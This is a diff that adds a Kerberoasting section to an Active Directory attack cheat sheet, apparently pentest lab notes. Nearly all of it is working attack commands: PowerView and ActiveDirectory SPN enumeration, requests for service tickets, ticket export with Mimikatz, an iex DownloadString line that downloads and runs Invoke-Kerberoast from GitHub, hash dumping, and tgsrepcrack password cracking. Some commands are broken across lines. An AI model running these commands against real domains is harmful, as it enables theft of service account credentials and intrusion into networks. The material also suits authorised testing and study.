@@ -453,10 +453,51 @@ Get-RemoteMachineAccountHash -ComputerName dc01.ecorp.lab -Verbose
 
 
 # Kerberoasting
+#### Find SPN
+```Get-NetUser –SPN```
+
+OR ActiveDirectory module:
+```
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -
+Properties ServicePrincipalName
+```
 
 
 
-####
+#### Get SPN
+```Get-DomainSPNTicket -SPN MSSQLSvc/dbsrv01.ecorp.lab```
 
-####
+```“HTTP/websrv01.ecorp.lab”,“HTTP/websrv02.ecorp.lab” | Get-DomainSPNTicket```
 
+```Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR```
+
+OR
+
+```Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityTok en -ArgumentList "MSSQLSvc/dbsrv01.ecorp.lab"```
+#### Check and Dump Tickets
+
+```klist```
+
+Export all tickets using Mimikatz:
+
+```Invoke-Mimikatz -Command '"kerberos::list /export"'```
+
+
+#### Invoke-Kerberoast
+https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/
+
+```
+iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+```
+
+```Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII Output_TGSs```
+
+
+#### Crack SPN
+
+https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
+
+Crack the Service account password:
+
+```python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
+40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```
